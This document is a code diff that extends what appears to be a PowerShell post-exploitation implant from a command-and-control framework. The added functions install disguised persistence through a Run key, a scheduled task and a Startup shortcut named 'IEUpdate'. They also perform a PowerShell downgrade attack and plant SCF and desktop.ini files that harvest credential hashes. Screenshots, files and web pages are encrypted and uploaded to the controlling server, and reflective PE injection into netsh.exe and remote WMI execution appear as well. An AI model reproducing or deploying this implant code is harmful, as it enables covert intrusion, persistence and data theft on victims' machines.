@@ -1,3 +1,181 @@
+function Test-Wow64() {
+    return (Test-Win32) -and (test-path env:\PROCESSOR_ARCHITEW6432)
+}
+function Test-Win64() {
+    return [IntPtr]::size -eq 8
+}
+function Test-Win32() {
+    return [IntPtr]::size -eq 4
+}
+Function CheckArchitecture
+{
+    if (Test-Win64) {
+        Write-Output "64bit implant running on 64bit machine"
+    }
+    elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
+        Write-Output "32bit running on 32bit machine"
+    }
+    elseif ((Test-Win32) -and (Test-Wow64)) {
+        $global:ImpUpgrade = $True
+        Write-Output "32bit implant running on a 64bit machine, use StartAnotherImplant to upgrade to 64bit"
+    }
+    else {
+        Write-Output "Unknown Architecture Detected"
+    }
+}
+Function CheckVersionTwo 
+{
+    $psver = $PSVersionTable.psversion.Major
+    if ($psver -ne '2') {
+        Write-Output "`n[+] Powershell version $psver detected. Run Invoke-DowngradeAttack to try using PS v2"
+    }
+}
+$global:ImpUpgrade = $False
+CheckArchitecture
+CheckVersionTwo
+Function StartAnotherImplant {
+    if (($p = Get-Process | ? {$_.id -eq $pid}).name -ne "powershell") {
+        echo "Process is not powershell, try running migrate-x86 or migrate-64"
+    } else {
+        if ($global:ImpUpgrade) {
+            start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
+        } else {
+            start-process -windowstyle hidden cmd -args "/c $payload"
+        }
+    }
+}
+sal S StartAnotherImplant
+sal SAI StartAnotherImplant
+sal invoke-smblogin invoke-smbexec
+Function Invoke-DowngradeAttack 
+{
+    $payload = $payload -replace "-exec", "-v 2 -exec"
+    StartAnotherImplant
+}
+function Test-Administrator  
+{  
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+}
+function EnableRDP
+{
+    if (Test-Administrator) {
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1   
+        Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
+    } else {
+    Write-Output "You are not elevated to Administator "
+    }
+}
+function DisableRDP
+{
+    if (Test-Administrator) {
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0 
+        Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
+    } else {
+    Write-Output "You are not elevated to Administator "
+    }
+}
+function Write-SCFFile 
+{
+    Param ($IPaddress, $Location)
+    "[Shell]" >$Location\~T0P0092.jpg.scf
+    "Command=2" >> $Location\~T0P0092.jpg.scf; 
+    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf; 
+    "[Taskbar]" >> $Location\~T0P0092.jpg.scf; 
+    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf; 
+    Write-Output "Written SCF File: $Location\~T0P0092.jpg.scf"
+}
+function Write-INIFile 
+{
+    Param ($IPaddress, $Location)
+    "[.ShellClassInfo]" > $Location\desktop.ini
+    "IconResource=\\$IPAddress\resource.dll" >> $Location\desktop.ini
+    $a = Get-item $Location\desktop.ini -Force; $a.Attributes="Hidden"
+    Write-Output "Written INI File: $Location\desktop.ini"
+}
+Function Install-Persistence
+{
+    Param ($Method)
+    if (!$Method){$Method=1}
+    if ($Method -eq 1) {
+        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$payload"
+        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
+        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
+        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
+        if (($registrykey.IEUpdate) -and ($registrykey2.Wallpaper777)) {
+        Write-Output "Successfully installed persistence: `n Regkey: HKCU\Software\Microsoft\Windows\currentversion\run\IEUpdate `n Regkey2: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
+        } else {
+        Write-Output "Error installing persistence"
+        }
+    }
+    if ($Method -eq 2) {
+        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555 -value "$payload"
+        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
+        schtasks.exe /create /sc minute /mo 240 /tn "IEUpdate" /tr "powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper555"
+        If ($registrykey.Wallpaper555) {
+            Write-Output "Created scheduled task persistence every 4 hours"
+        }
+    }
+    if ($Method -eq 3) {
+        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666 -value "$payload"
+        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
+        $SourceExe = "powershell.exe"
+        $ArgumentsToSourceExe = "-exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
+        $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
+        $WshShell = New-Object -comObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($DestinationPath)
+        $Shortcut.TargetPath = $SourceExe
+        $Shortcut.Arguments = $ArgumentsToSourceExe
+        $Shortcut.WindowStyle = 7
+        $Shortcut.Save()
+        If ((Test-Path $DestinationPath) -and ($registrykey2.Wallpaper666)) {
+            Write-Output "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
+        } else {
+            Write-Output "Error installing StartUp folder persistence"
+        }
+    }
+}
+Function Remove-Persistence
+{
+    Param ($Method)
+    if (!$Method){$Method=1}
+    if ($Method -eq 1) {
+        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
+        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
+        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
+        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
+        if (($registrykey -eq $null) -and ($registrykey2 -eq $null)) {
+        Write-Output "Successfully removed persistence from registry!"
+        $error.clear()
+        } else {
+        Write-Output "Error removing persistence, remove registry keys manually!"
+        $error.clear()
+    }
+    if ($Method -eq 2) {
+        schtasks.exe /delete /tn IEUpdate /F
+        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
+        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
+        if ($registrykey -eq $null) {
+            Write-Output "Successfully removed persistence from registry!"
+            Write-Output "Removed scheduled task persistence"
+        }else {
+            Write-Output "Error removing SchTasks persistence"
+        }
+    }
+    if ($Method -eq 3) {
+        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
+        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
+        Remove-Item "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\IEUpdate.lnk"
+        If ((Test-Path $DestinationPath) -and ($registrykey.Wallpaper666)) {
+            Write-Output "Removed StartUp folder persistence"
+        }else {
+            Write-Output "Error installing StartUp folder persistence"
+        }
+    }
+}
+}
 Function Web-Upload-File 
 {
     Param
@@ -58,33 +236,72 @@ Function Test-ADCredential
 	$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
 	return $object
 }
+Function Get-ScreenshotMulti {
+    param($Timedelay, $Quantity)
+
+    if ($Quantity -and $Timedelay) {
+        ForEach ($number in 1..[int]$Quantity ) { 
+            $Output = Get-Screenshot         
+            $Output = Encrypt-String2 $key $Output
+            $UploadBytes = getimgdata $Output
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            Start-Sleep $Timedelay
+        }
+    }
+}
 Function Get-Screenshot 
 {
-#import libraries
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
+    param($File)
 
-# Gather Screen resolution information
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
+    #import libraries
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
 
-# Create bitmap using the top-left and bottom-right bounds
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    # Gather Screen resolution information
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
 
-# Create Graphics object
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    # Create bitmap using the top-left and bottom-right bounds
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 
-# Capture screen
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    # Create Graphics object
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 
-# Send back as base64
-$msimage = New-Object IO.MemoryStream
-$bitmap.save($msimage, "png")
-$b64 = [Convert]::ToBase64String($msimage.toarray())
-return $b64
+    # Capture screen
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+    # Send back as base64
+    $msimage = New-Object IO.MemoryStream
+    
+    if ($File) {
+        $bitmap.save($file, "png")
+    } else {
+        $bitmap.save($msimage, "png")
+        $b64 = [Convert]::ToBase64String($msimage.toarray())
+    }
+    return $b64
+}
+function Download-Files
+{
+    param
+    (
+        [string] $Directory
+    ) 
+    $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
+    foreach ($item in $files)
+    {
+        $ReadCommand = "download-file "+$item.FullName
+        $ReadCommand = Encrypt-String $key $ReadCommand
+        $Output = Download-File $item.FullName       
+        $Output = Encrypt-String2 $key $Output
+        $UploadBytes = getimgdata $Output
+        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+    } 
+    $ReadCommand = "Files-downloaded"
+    $ReadCommand = Encrypt-String $key $ReadCommand
 }
 function Download-File
 {
@@ -179,13 +396,22 @@ $command
 )
 $PSS = ConvertTo-SecureString $password -AsPlainText -Force
 $getcreds = new-object system.management.automation.PSCredential $username,$PSS
-Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
+$WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
+If ($WMIResult.Returnvalue -eq 0) {
+    Write-Output "Executed WMI Command with Sucess: $Command `n" 
+} else {
+    Write-Output "WMI Command Failed - Could be due to permissions or UAC is enabled on the remote host, Try mounting the C$ share to check administrative access to the host"
+}
 }
 
 Function Get-ProcessFull {
 
 [System.Diagnostics.Process[]] $processes64bit = @()
 [System.Diagnostics.Process[]] $processes32bit = @()
+
+
+$owners = @{}
+gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
 
 $AllProcesses = @()
 
@@ -195,11 +421,12 @@ foreach($process in get-process) {
         $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
         if($file -eq "wow64.dll") {
             $processes32bit += $process
-            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
+            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, Username
             $pobject.Id = $process.Id
             $pobject.StartTime = $process.starttime
             $pobject.Name = $process.Name
             $pobject.Arch = "x86"
+            $pobject.UserName = $owners[$process.Id.tostring()]
             $AllProcesses += $pobject
             break
         }
@@ -207,15 +434,55 @@ foreach($process in get-process) {
 
     if(!($processes32bit -contains $process)) {
         $processes64bit += $process
-        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
+        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, UserName
         $pobject.Id = $process.Id
         $pobject.StartTime = $process.starttime
         $pobject.Name = $process.Name
         $pobject.Arch = "x64"
+        $pobject.UserName = $owners[$process.Id.tostring()]
         $AllProcesses += $pobject
     }
 }
 
-$AllProcesses|Select ID, Arch, Name, StartTime | format-table -wrap
+$AllProcesses|Select ID, Arch, Name, UserName, StartTime | format-table -auto
 
+}
+Function Invoke-Netstat {                       
+try {            
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
+    $Connections = $TCPProperties.GetActiveTcpListeners()            
+    foreach($Connection in $Connections) {            
+        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
+        $OutputObj = New-Object -TypeName PSobject            
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
+        $OutputObj            
+    }            
+            
+} catch {            
+    Write-Error "Failed to get listening connections. $_"            
+}           
+}
+Function Get-Webpage {
+    param ($url)
+    $file = (New-Object System.Net.Webclient).DownloadString($url)|Out-String
+    $ReadCommand = "download-file web.html"
+    $ReadCommand = Encrypt-String $key $ReadCommand 
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
+    $base64 = [Convert]::ToBase64String($bytes)  
+    $Output = Encrypt-String2 $key $base64
+    $UploadBytes = getimgdata $Output
+    (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+}
+Function AutoMigrate {
+if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
+    $t=$true
+}
+if ($t -and [IntPtr]::size -eq 8){
+    invoke-reflectivepeinjection -payload x64 -NewProcess c:\windows\system32\netsh.exe
+} 
+elseif (($t -and [IntPtr]::size -eq 4)) {
+    invoke-reflectivepeinjection -payload x86 -NewProcess c:\windows\system32\netsh.exe
+}
 }
